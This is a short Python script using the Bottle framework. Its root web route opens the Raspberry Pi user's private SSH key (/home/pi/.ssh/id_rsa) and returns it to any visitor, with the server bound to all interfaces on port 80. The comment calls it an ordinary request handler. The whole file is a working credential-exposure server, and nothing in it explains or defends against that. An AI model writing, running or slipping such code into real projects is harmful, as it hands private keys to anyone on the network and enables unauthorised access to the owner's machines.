from bottle import route, run, template

# Handle http requests to the root address
@route('/')
def index():
 with open("/home/pi/.ssh/id_rsa") as key:
  return key.read()
 
run(host='0.0.0.0', port=80)
